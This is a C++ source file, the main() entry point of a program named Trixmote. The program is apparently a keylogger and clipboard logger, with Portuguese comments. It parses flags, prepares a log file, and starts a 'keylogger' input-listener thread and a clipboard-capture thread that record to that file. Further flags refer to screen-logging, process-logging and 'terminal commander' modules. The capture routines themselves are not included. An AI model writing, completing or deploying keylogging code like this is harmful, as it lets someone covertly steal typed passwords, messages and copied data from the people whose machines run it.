#include <iostream>
#include <fstream>
#include <thread>
#include "TXArgumentation.h"
#include "TXLogger.h"
#include "TXInputListener.h"
#include "TXPresenter.h"
#include "TXClipboard.h"

int main(int argc, const char *args[]) {
    TXArgumentation *argumentation = new TXArgumentation(argc, args);

    // Mostrar versão do Trixmote
    if (argumentation->hasArg((char *) "--version") || argumentation->hasArg((char *) "-v")) {
        TXPresenter::showVersion();
        exit(0);
    }

    // Mostrar menu de ajuda do Trixmote
    if (argumentation->hasArg((char *) "--help") || argumentation->hasArg((char *) "-h")) {
        TXPresenter::showHelp();
        exit(0);
    }

    // Welcome to... K S V!!
    TXPresenter::showHeader();

    TXLogger *logger = TXLogger::instance();
    bool useSameLogFile = true;
    char *file;

    // Obtem o PATH para o arquivo de log de saída, informado no parâmetro de entrada --logFile [path]
    char *inputFileLog = argumentation->value((char *) "--logFile");
    if (inputFileLog != nullptr) {
        file = inputFileLog;
    } else {
        logger->e("Log file output not found! Use --logFile parameter to specify a path to log file. Stopping Trixmote Trixlogger...");
        exit(1);
    }

    std::cout << "[INFO] Log will be saved at \"" << file << "\"" << std::endl;

    // Verifica se o arquivo de log ja existe
    if (std::ifstream(file)) {
        logger->i("Log file already exists");

        if (argumentation->hasArg((char *) "--clear") || argumentation->hasArg((char *) "-c")) {
            logger->i("Clearing log file!");
            useSameLogFile = false;
        } else {
            logger->i("Appending mode on log file!");
        }

        // é para usar o mesmo arquivo? se sim, limpa ele.
        if (useSameLogFile) {
            logger->initLogFile(file, true);
            logger->clearLogFile();

            logger->write("[");
            logger->write(TXPresenter::version());
            logger->writeln("]");
        }

    } else {
        logger->initLogFile(file, false);
        logger->i("Log file does not exists... Creating on append mode!");

        logger->write("[");
        logger->write(TXPresenter::version());
        logger->writeln("]");
    }

    logger->line();

    TXInputListener keylogger;
    TXCLipboard clipboard;

    // Registra as threads dos Runners para captura de eventos
    std::thread thread[2];
    thread[0] = std::thread(keylogger);
    thread[1] = std::thread(clipboard);

    bool disableKeyboard = argumentation->hasArg((char *) "--disableKeylogger");
    bool disableClipboard = argumentation->hasArg((char *) "--disableClipboard");
    bool disableScreenlogger = argumentation->hasArg((char *) "--disableScreenlogger");
    bool disableProcesslogger = argumentation->hasArg((char *) "--disableProcesslogger");
    bool disableTerminalCommander = argumentation->hasArg((char *) "--disableTerminalCommander");

    // Verifica se o clipboard deve ser ativado
    if (!disableClipboard) {

        // Inicia a execução da thread de forma independente, sem fazer com que o processo main espere.
        thread[1].detach();
    } else {
        logger->w("CLIPBOARD DISABLED");
    }


    // Verifica se o keylogger deve ser ativado
    if (!disableKeyboard) {

        // Inicia a execucão do TXInputListener e faz o processo main esperar.
        thread[0].join();
    } else {
        logger->w("KEYLOGGER DISABLED");
    }


    return 0;
}